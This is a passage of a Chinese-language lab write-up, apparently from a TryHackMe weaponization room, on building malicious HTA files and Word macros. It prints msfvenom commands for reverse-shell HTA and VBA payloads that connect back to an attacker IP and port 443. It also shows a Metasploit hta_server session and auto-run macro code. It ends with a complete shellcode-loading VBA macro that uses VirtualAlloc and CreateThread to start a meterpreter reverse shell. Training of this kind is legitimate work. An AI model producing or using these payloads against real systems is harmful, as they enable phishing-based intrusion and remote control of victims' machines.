<p>在受害计算机上，使用 Microsoft Edge 访问恶意链接，<a target="_blank" rel="noopener" href="http://10.8.232.37:8090/payload.hta%E3%80%82%E8%AF%B7%E6%B3%A8%E6%84%8F%EF%BC%8C10.8.232.37">http://10.8.232.37:8090/payload.hta。请注意，10.8.232.37</a> 是 AttackBox 的 IP 地址。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135300.png" alt="image-20240712211341373"></p>
<p>一旦我们按下“运行”，payload.hta 就会被执行，然后它将调用 cmd.exe。下图说明我们已经成功执行了cmd.exe.</p>
<h2 id="hta反向连接">HTA反向连接</h2>
<p>我们可以创建一个反向 shell 有效负载，如下所示：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<span class="hljs-number">10.8</span>.<span class="hljs-number">232.37</span> LPORT=<span class="hljs-number">443</span> -f hta-psh -o thm.hta
[-] No platform was selected, choosing <span class="hljs-attribute">Msf</span>::<span class="hljs-attribute">Module</span>::<span class="hljs-attribute">Platform</span>::Windows from the payload
[-] No arch selected, selecting <span class="hljs-attribute">arch</span>: x64 from the payload
No encoder specified, outputting raw payload
Payload <span class="hljs-attribute">size</span>: <span class="hljs-number">460</span> bytes
Final size of hta-psh <span class="hljs-attribute">file</span>: <span class="hljs-number">7692</span> bytes
Saved <span class="hljs-attribute">as</span>: thm.hta</code></pre>
<p>我们使用 Metasploit 框架中的 msfvenom 生成恶意负载以连接回攻击机器。我们使用以下有效负载将 windows/x64/shell_reverse_tcp 连接到我们的 IP 和侦听端口。</p>
<p>在攻击机上，我们需要使用nc监听443端口。请注意，此端口需要 root 权限才能打开，或者您可以使用不同的权限。</p>
<p>一旦受害者访问恶意 URL 并点击运行，我们就会恢复连接。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135301.png" alt="image-20240712211809835"></p>
<h2 id="通过-metasploit-的恶意-hta">通过 Metasploit 的恶意 HTA</h2>
<p>还有另一种方法可以使用 Metasploit 框架生成和提供恶意 HTA 文件。首先，使用 msfconsole -q 命令运行 Metasploit 框架。在exploit部分下有exploit/windows/misc/hta_server，需要选择并设置LHOST、LPORT、SRVHOST、Payload等信息，最后执行exploit来运行该模块。</p>
<pre><code class="hljs scss">msf6 &gt; use exploit/windows/misc/hta_server
msf6 <span class="hljs-built_in">exploit</span>(windows/misc/hta_server) &gt; set LHOST <span class="hljs-number">10.8</span><span class="hljs-selector-class">.232</span><span class="hljs-selector-class">.37</span>
LHOST =&gt; <span class="hljs-number">10.8</span><span class="hljs-selector-class">.232</span><span class="hljs-selector-class">.37</span>
msf6 <span class="hljs-built_in">exploit</span>(windows/misc/hta_server) &gt; set LPORT <span class="hljs-number">443</span>
LPORT =&gt; <span class="hljs-number">443</span>
msf6 <span class="hljs-built_in">exploit</span>(windows/misc/hta_server) &gt; set SRVHOST <span class="hljs-number">10.8</span><span class="hljs-selector-class">.232</span><span class="hljs-selector-class">.37</span>
SRVHOST =&gt; <span class="hljs-number">10.8</span><span class="hljs-selector-class">.232</span><span class="hljs-selector-class">.37</span>
msf6 <span class="hljs-built_in">exploit</span>(windows/misc/hta_server) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
msf6 <span class="hljs-built_in">exploit</span>(windows/misc/hta_server) &gt; exploit
<span class="hljs-selector-attr">[*]</span> Exploit running as <span class="hljs-attribute">background</span> job <span class="hljs-number">0</span>.
<span class="hljs-selector-attr">[*]</span> Exploit completed, but no session was created.
msf6 <span class="hljs-built_in">exploit</span>(windows/misc/hta_server) &gt;
<span class="hljs-selector-attr">[*]</span> Started reverse TCP handler on <span class="hljs-number">10.8</span><span class="hljs-selector-class">.232</span><span class="hljs-selector-class">.37</span>:<span class="hljs-number">443</span>
[*] Using URL: http://<span class="hljs-number">10.8</span>.<span class="hljs-number">232.37</span>:<span class="hljs-number">8080</span>/TkWV9zkd.hta
[*] Server started.</code></pre>
<p>在受害计算机上，一旦我们访问 Metasploit 作为 URL 提供的恶意 HTA 文件，我们应该会收到反向连接。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135302.png" alt="image-20240712212611686"></p>
<h1 id="0x05-visual-basic-for-application-vba">0x05 Visual Basic for Application (VBA)</h1>
<h2 id="visual-basic-应用程序-vba">Visual Basic 应用程序 (VBA)</h2>
<p>VBA 代表 Visual Basic for Applications，是 Microsoft 为 Microsoft Word、Excel、PowerPoint 等 Microsoft 应用程序实现的一种编程语言。VBA 编程允许自动执行用户与 Microsoft Office 应用程序之间几乎所有键盘和鼠标交互的任务。</p>
<p>宏是 Microsoft Office 应用程序，其中包含以 Visual Basic for Applications (VBA) 编程语言编写的嵌入式代码。它用于创建自定义函数，通过创建自动化流程来加速手动任务。 VBA 的功能之一是访问 Windows 应用程序编程接口 (<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Windows_API">API</a>) 和其他低级功能。有关 VBA 的更多信息，<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Visual_Basic_for_Applications">请访问此处</a>。</p>
<p>在此任务中，我们将讨论 VBA 的基础知识以及攻击者使用宏创建恶意 Microsoft 文档的方式。要跟进此任务的内容，请确保在任务 2 中部署连接的 Windows 计算机。准备就绪后，即可通过浏览器内访问使用它。</p>
<p>现在从“开始”菜单打开 Microsoft Word 2016。打开后，我们将关闭产品密钥窗口，因为我们将在 7 天的试用期内使用它。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135303.png" alt="image-20240714102127685"></p>
<p>接下来，请确保接受关闭产品密钥窗口后显示的 Microsoft Office 许可协议。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135304.png" alt="image-20240714102827060"></p>
<p>现在创建一个新的空白 Microsoft 文档来创建我们的第一个宏。目标是讨论该语言的基础知识并展示如何在打开 Microsoft Word 文档时运行它。首先，我们需要通过选择“视图”→“宏”来打开 Visual Basic 编辑器。宏窗口显示在文档中创建我们自己的宏。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135305.png" alt="image-20240714102958948"></p>
<p>在宏名称部分，我们选择将宏命名为 THM。请注意，我们需要从列表 Document1 中的宏中进行选择，最后选择创建。接下来，Microsoft Visual Basic for Application 编辑器显示了我们可以在哪里编写 VBA 代码。让我们尝试显示一个消息框，其中包含以下消息：欢迎来到武器化室！。我们可以使用 MsgBox 函数来做到这一点，如下所示：</p>
<pre><code class="hljs javascript"><span class="hljs-title class_">Sub</span> <span class="hljs-title function_">THM</span>()
  <span class="hljs-title class_">MsgBox</span> (<span class="hljs-string">"Welcome to Weaponization Room!"</span>)
<span class="hljs-title class_">End</span> <span class="hljs-title class_">Sub</span></code></pre>
<p>最后，按 F5 或 Run → Run Sub/UserForm 运行宏。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135306.png" alt="image-20240714103239190"></p>
<p>现在，为了在文档打开后自动执行 VBA 代码，我们可以使用 AutoOpen 和 Document_open 等内置函数。请注意，我们需要指定文档打开后需要运行的函数名称，在我们的例子中是 THM 函数。</p>
<pre><code class="hljs js"><span class="hljs-title class_">Sub</span> <span class="hljs-title class_">Document</span>_Open()
  <span class="hljs-variable constant_">THM</span>
<span class="hljs-title class_">End</span> <span class="hljs-title class_">Sub</span>

<span class="hljs-title class_">Sub</span> <span class="hljs-title class_">AutoOpen</span>()
  <span class="hljs-variable constant_">THM</span>
<span class="hljs-title class_">End</span> <span class="hljs-title class_">Sub</span>

<span class="hljs-title class_">Sub</span> <span class="hljs-title function_">THM</span>()
   <span class="hljs-title class_">MsgBox</span> (<span class="hljs-string">"Welcome to Weaponization Room!"</span>)
<span class="hljs-title class_">End</span> <span class="hljs-title class_">Sub</span></code></pre>
<p>需要注意的是，为了使宏起作用，我们需要将其保存为启用宏的格式，例如.doc和docm。现在，让我们将文件另存为 Word 97-2003 模板，其中通过转到文件 → 保存 Document1 并保存为类型 → Word 97-2003 文档启用宏，最后保存。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135307.png" alt="image-20240714103632799"></p>
<p>让我们关闭保存的Word文档。如果我们重新打开文档文件，Microsoft Word 将显示一条安全消息，指示宏已被禁用，并为我们提供启用它的选项。让我们启用它并继续检查结果。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135308.png" alt="image-20240714103747457"></p>
<p>一旦我们允许启用内容，我们的宏就会执行，如图所示，</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135309.png" alt="image-20240714103845689"></p>
<p>现在编辑 Word 文档并创建一个执行 calc.exe 或任何可执行文件的宏函数作为概念证明，如下所示，</p>
<pre><code class="hljs javascript"><span class="hljs-title class_">Sub</span> <span class="hljs-title class_">PoC</span>()
	<span class="hljs-title class_">Dim</span> payload <span class="hljs-title class_">As</span> <span class="hljs-title class_">String</span>
	payload = <span class="hljs-string">"calc.exe"</span>
	<span class="hljs-title class_">CreateObject</span>(<span class="hljs-string">"Wscript.Shell"</span>).<span class="hljs-property">Run</span> payload,<span class="hljs-number">0</span>
<span class="hljs-title class_">End</span> <span class="hljs-title class_">Sub</span></code></pre>
<p>为了详细解释代码，我们使用 Dim 关键字将有效负载变量声明为字符串。使用payload =“calc.exe”，我们指定有效负载名称，最后使用CreateObject(“Wscript.Shell”).Run有效负载，我们创建一个Windows脚本主机(WSH)对象并运行有效负载。请注意，如果要重命名函数名称，则必须在 AutoOpen() 和 Document_open() 函数中也包含该函数名称。</p>
<p>确保在使用编辑器中的运行功能保存文档之前测试您的代码。确保在保存文档之前创建 AutoOpen() 和 Document_open() 函数。代码运行后，现在保存文件并尝试再次打开它。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135310.png" alt="image-20240714104717526"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135311.png" alt="image-20240714104651982"></p>
<p>值得一提的是，我们可以将 VBA 与之前介绍的方法（例如 HTA 和 WSH）结合起来。 VBA/宏本身不会绕过任何检测。</p>
<p>现在让我们使用 Metasploit 框架创建一个内存中的 meterpreter 有效负载来接收反向 shell。首先，从 AttackBox 中，我们使用 msfvenom 创建 meterpreter 有效负载。我们需要指定 PayloadLHOST 和 LPORT，它们与 Metasploit 框架中的内容相匹配。请注意，我们将有效负载指定为 VBA 以将其用作宏。</p>
<pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">p</span> windows/meterpreter/reverse_tcp LHOST=xx LPORT=xxx -f vba</code></pre>
<p>输出如下。</p>
<p>上述终端中 LHOST 的值是我们使用的 AttackBox IP 地址的示例。对于您的情况，您需要指定 AttackBox 的 IP 地址。</p>
<p>导入时请注意，需要进行一项修改才能使其工作。输出将在 MS Excel 工作表上运行。因此，将 Workbook_Open() 更改为 Document_Open() 以使其适合 MS Word 文档。</p>
<p>现在复制输出并将其保存到 MS Word 文档的宏编辑器中，如我们之前所示。在攻击机器上，运行 Metasploit 框架并设置监听器，如下所示：</p>
<pre><code class="hljs scss"><span class="hljs-selector-id">#If</span> Vba7 Then
        Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Kuntsbgye As Long, ByVal Gmcygvnpd As Long, ByVal Ofrtwf As LongPtr, Zottuefr As Long, ByVal Nhlegnz As Long, Nopspbo As Long) As LongPtr
        Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Updmoar As Long, ByVal Ybijmv As Long, ByVal Qgtuzues As Long, ByVal Clhvgup As Long) As LongPtr
        Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Gxswqp As LongPtr, ByRef Qczd As Any, ByVal Blejylm As Long) As LongPtr
<span class="hljs-selector-id">#Else</span>
        Private Declare Function CreateThread Lib "kernel32" (ByVal Kuntsbgye As Long, ByVal Gmcygvnpd As Long, ByVal Ofrtwf As Long, Zottuefr As Long, ByVal Nhlegnz As Long, Nopspbo As Long) As Long
        Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Updmoar As Long, ByVal Ybijmv As Long, ByVal Qgtuzues As Long, ByVal Clhvgup As Long) As Long
        Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Gxswqp As Long, ByRef Qczd As Any, ByVal Blejylm As Long) As Long
<span class="hljs-selector-id">#EndIf</span>

Sub <span class="hljs-built_in">Auto_Open</span>()
        Dim Nkvk As Long, Nglfz As Variant, Cnmkevvvf As Long
<span class="hljs-selector-id">#If</span> Vba7 Then
        Dim  Dauujgm As LongPtr, Ecezevp As LongPtr
<span class="hljs-selector-id">#Else</span>
        Dim  Dauujgm As Long, Ecezevp As Long
<span class="hljs-selector-id">#EndIf</span>
        Nglfz = <span class="hljs-built_in">Array</span>(<span class="hljs-number">252</span>,<span class="hljs-number">232</span>,<span class="hljs-number">143</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">96</span>,<span class="hljs-number">49</span>,<span class="hljs-number">210</span>,<span class="hljs-number">137</span>,<span class="hljs-number">229</span>,<span class="hljs-number">100</span>,<span class="hljs-number">139</span>,<span class="hljs-number">82</span>,<span class="hljs-number">48</span>,<span class="hljs-number">139</span>,<span class="hljs-number">82</span>,<span class="hljs-number">12</span>,<span class="hljs-number">139</span>,<span class="hljs-number">82</span>,<span class="hljs-number">20</span>,<span class="hljs-number">49</span>,<span class="hljs-number">255</span>,<span class="hljs-number">139</span>,<span class="hljs-number">114</span>,<span class="hljs-number">40</span>,<span class="hljs-number">15</span>,<span class="hljs-number">183</span>,<span class="hljs-number">74</span>,<span class="hljs-number">38</span>,<span class="hljs-number">49</span>,<span class="hljs-number">192</span>,<span class="hljs-number">172</span>,<span class="hljs-number">60</span>,<span class="hljs-number">97</span>,<span class="hljs-number">124</span>,<span class="hljs-number">2</span>,<span class="hljs-number">44</span>,<span class="hljs-number">32</span>,<span class="hljs-number">193</span>,<span class="hljs-number">207</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>,<span class="hljs-number">199</span>,<span class="hljs-number">73</span>,<span class="hljs-number">117</span>,<span class="hljs-number">239</span>,<span class="hljs-number">82</span>,<span class="hljs-number">139</span>,<span class="hljs-number">82</span>,<span class="hljs-number">16</span>,<span class="hljs-number">139</span>,<span class="hljs-number">66</span>,<span class="hljs-number">60</span>,<span class="hljs-number">87</span>,<span class="hljs-number">1</span>,<span class="hljs-number">208</span>,<span class="hljs-number">139</span>,<span class="hljs-number">64</span>,<span class="hljs-number">120</span>,<span class="hljs-number">133</span>,<span class="hljs-number">192</span>,<span class="hljs-number">116</span>,<span class="hljs-number">76</span>,<span class="hljs-number">1</span>,<span class="hljs-number">208</span>,<span class="hljs-number">80</span>,<span class="hljs-number">139</span>,<span class="hljs-number">88</span>,<span class="hljs-number">32</span>,<span class="hljs-number">1</span>,<span class="hljs-number">211</span>,<span class="hljs-number">139</span>,<span class="hljs-number">72</span>,<span class="hljs-number">24</span>,<span class="hljs-number">133</span>,<span class="hljs-number">201</span>,<span class="hljs-number">116</span>,<span class="hljs-number">60</span>,<span class="hljs-number">73</span>,<span class="hljs-number">139</span>, _
<span class="hljs-number">52</span>,<span class="hljs-number">139</span>,<span class="hljs-number">1</span>,<span class="hljs-number">214</span>,<span class="hljs-number">49</span>,<span class="hljs-number">255</span>,<span class="hljs-number">49</span>,<span class="hljs-number">192</span>,<span class="hljs-number">172</span>,<span class="hljs-number">193</span>,<span class="hljs-number">207</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>,<span class="hljs-number">199</span>,<span class="hljs-number">56</span>,<span class="hljs-number">224</span>,<span class="hljs-number">117</span>,<span class="hljs-number">244</span>,<span class="hljs-number">3</span>,<span class="hljs-number">125</span>,<span class="hljs-number">248</span>,<span class="hljs-number">59</span>,<span class="hljs-number">125</span>,<span class="hljs-number">36</span>,<span class="hljs-number">117</span>,<span class="hljs-number">224</span>,<span class="hljs-number">88</span>,<span class="hljs-number">139</span>,<span class="hljs-number">88</span>,<span class="hljs-number">36</span>,<span class="hljs-number">1</span>,<span class="hljs-number">211</span>,<span class="hljs-number">102</span>,<span class="hljs-number">139</span>,<span class="hljs-number">12</span>,<span class="hljs-number">75</span>,<span class="hljs-number">139</span>,<span class="hljs-number">88</span>,<span class="hljs-number">28</span>,<span class="hljs-number">1</span>,<span class="hljs-number">211</span>,<span class="hljs-number">139</span>,<span class="hljs-number">4</span>,<span class="hljs-number">139</span>,<span class="hljs-number">1</span>,<span class="hljs-number">208</span>,<span class="hljs-number">137</span>,<span class="hljs-number">68</span>,<span class="hljs-number">36</span>,<span class="hljs-number">36</span>,<span class="hljs-number">91</span>,<span class="hljs-number">91</span>,<span class="hljs-number">97</span>,<span class="hljs-number">89</span>,<span class="hljs-number">90</span>,<span class="hljs-number">81</span>,<span class="hljs-number">255</span>,<span class="hljs-number">224</span>,<span class="hljs-number">88</span>,<span class="hljs-number">95</span>,<span class="hljs-number">90</span>,<span class="hljs-number">139</span>,<span class="hljs-number">18</span>,<span class="hljs-number">233</span>,<span class="hljs-number">128</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">93</span>,<span class="hljs-number">104</span>,<span class="hljs-number">51</span>,<span class="hljs-number">50</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">104</span>,<span class="hljs-number">119</span>,<span class="hljs-number">115</span>,<span class="hljs-number">50</span>,<span class="hljs-number">95</span>,<span class="hljs-number">84</span>, _
<span class="hljs-number">104</span>,<span class="hljs-number">76</span>,<span class="hljs-number">119</span>,<span class="hljs-number">38</span>,<span class="hljs-number">7</span>,<span class="hljs-number">137</span>,<span class="hljs-number">232</span>,<span class="hljs-number">255</span>,<span class="hljs-number">208</span>,<span class="hljs-number">184</span>,<span class="hljs-number">144</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">41</span>,<span class="hljs-number">196</span>,<span class="hljs-number">84</span>,<span class="hljs-number">80</span>,<span class="hljs-number">104</span>,<span class="hljs-number">41</span>,<span class="hljs-number">128</span>,<span class="hljs-number">107</span>,<span class="hljs-number">0</span>,<span class="hljs-number">255</span>,<span class="hljs-number">213</span>,<span class="hljs-number">106</span>,<span class="hljs-number">10</span>,<span class="hljs-number">104</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">81</span>,<span class="hljs-number">232</span>,<span class="hljs-number">104</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">21</span>,<span class="hljs-number">179</span>,<span class="hljs-number">137</span>,<span class="hljs-number">230</span>,<span class="hljs-number">80</span>,<span class="hljs-number">80</span>,<span class="hljs-number">80</span>,<span class="hljs-number">80</span>,<span class="hljs-number">64</span>,<span class="hljs-number">80</span>,<span class="hljs-number">64</span>,<span class="hljs-number">80</span>,<span class="hljs-number">104</span>,<span class="hljs-number">234</span>,<span class="hljs-number">15</span>,<span class="hljs-number">223</span>,<span class="hljs-number">224</span>,<span class="hljs-number">255</span>,<span class="hljs-number">213</span>,<span class="hljs-number">151</span>,<span class="hljs-number">106</span>,<span class="hljs-number">16</span>,<span class="hljs-number">86</span>,<span class="hljs-number">87</span>,<span class="hljs-number">104</span>,<span class="hljs-number">153</span>,<span class="hljs-number">165</span>,<span class="hljs-number">116</span>,<span class="hljs-number">97</span>,<span class="hljs-number">255</span>,<span class="hljs-number">213</span>,<span class="hljs-number">133</span>,<span class="hljs-number">192</span>,<span class="hljs-number">116</span>,<span class="hljs-number">10</span>,<span class="hljs-number">255</span>,<span class="hljs-number">78</span>,<span class="hljs-number">8</span>,<span class="hljs-number">117</span>,<span class="hljs-number">236</span>,<span class="hljs-number">232</span>,<span class="hljs-number">103</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>, _
<span class="hljs-number">106</span>,<span class="hljs-number">0</span>,<span class="hljs-number">106</span>,<span class="hljs-number">4</span>,<span class="hljs-number">86</span>,<span class="hljs-number">87</span>,<span class="hljs-number">104</span>,<span class="hljs-number">2</span>,<span class="hljs-number">217</span>,<span class="hljs-number">200</span>,<span class="hljs-number">95</span>,<span class="hljs-number">255</span>,<span class="hljs-number">213</span>,<span class="hljs-number">131</span>,<span class="hljs-number">248</span>,<span class="hljs-number">0</span>,<span class="hljs-number">126</span>,<span class="hljs-number">54</span>,<span class="hljs-number">139</span>,<span class="hljs-number">54</span>,<span class="hljs-number">106</span>,<span class="hljs-number">64</span>,<span class="hljs-number">104</span>,<span class="hljs-number">0</span>,<span class="hljs-number">16</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">86</span>,<span class="hljs-number">106</span>,<span class="hljs-number">0</span>,<span class="hljs-number">104</span>,<span class="hljs-number">88</span>,<span class="hljs-number">164</span>,<span class="hljs-number">83</span>,<span class="hljs-number">229</span>,<span class="hljs-number">255</span>,<span class="hljs-number">213</span>,<span class="hljs-number">147</span>,<span class="hljs-number">83</span>,<span class="hljs-number">106</span>,<span class="hljs-number">0</span>,<span class="hljs-number">86</span>,<span class="hljs-number">83</span>,<span class="hljs-number">87</span>,<span class="hljs-number">104</span>,<span class="hljs-number">2</span>,<span class="hljs-number">217</span>,<span class="hljs-number">200</span>,<span class="hljs-number">95</span>,<span class="hljs-number">255</span>,<span class="hljs-number">213</span>,<span class="hljs-number">131</span>,<span class="hljs-number">248</span>,<span class="hljs-number">0</span>,<span class="hljs-number">125</span>,<span class="hljs-number">40</span>,<span class="hljs-number">88</span>,<span class="hljs-number">104</span>,<span class="hljs-number">0</span>,<span class="hljs-number">64</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">106</span>,<span class="hljs-number">0</span>,<span class="hljs-number">80</span>,<span class="hljs-number">104</span>,<span class="hljs-number">11</span>,<span class="hljs-number">47</span>,<span class="hljs-number">15</span>,<span class="hljs-number">48</span>,<span class="hljs-number">255</span>,<span class="hljs-number">213</span>,<span class="hljs-number">87</span>,<span class="hljs-number">104</span>,<span class="hljs-number">117</span>,<span class="hljs-number">110</span>,<span class="hljs-number">77</span>,<span class="hljs-number">97</span>,<span class="hljs-number">255</span>,<span class="hljs-number">213</span>, _
<span class="hljs-number">94</span>,<span class="hljs-number">94</span>,<span class="hljs-number">255</span>,<span class="hljs-number">12</span>,<span class="hljs-number">36</span>,<span class="hljs-number">15</span>,<span class="hljs-number">133</span>,<span class="hljs-number">112</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">233</span>,<span class="hljs-number">155</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">1</span>,<span class="hljs-number">195</span>,<span class="hljs-number">41</span>,<span class="hljs-number">198</span>,<span class="hljs-number">117</span>,<span class="hljs-number">193</span>,<span class="hljs-number">195</span>,<span class="hljs-number">187</span>,<span class="hljs-number">240</span>,<span class="hljs-number">181</span>,<span class="hljs-number">162</span>,<span class="hljs-number">86</span>,<span class="hljs-number">106</span>,<span class="hljs-number">0</span>,<span class="hljs-number">83</span>,<span class="hljs-number">255</span>,<span class="hljs-number">213</span>)

        Dauujgm = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-number">0</span>, UBound(Nglfz), &amp;H1000, &amp;H40)
        For Cnmkevvvf = <span class="hljs-built_in">LBound</span>(Nglfz) To <span class="hljs-built_in">UBound</span>(Nglfz)
                Nkvk = <span class="hljs-built_in">Nglfz</span>(Cnmkevvvf)
                Ecezevp = <span class="hljs-built_in">RtlMoveMemory</span>(Dauujgm + Cnmkevvvf, Nkvk, <span class="hljs-number">1</span>)
        Next Cnmkevvvf
        Ecezevp = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, Dauujgm, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
End Sub
Sub <span class="hljs-built_in">AutoOpen</span>()
        Auto_Open
End Sub
Sub <span class="hljs-built_in">Document_Open</span>()
        Auto_Open
End Sub</code></pre>
<p>记得攻击机上开启msfconsole的handler监听模块</p>
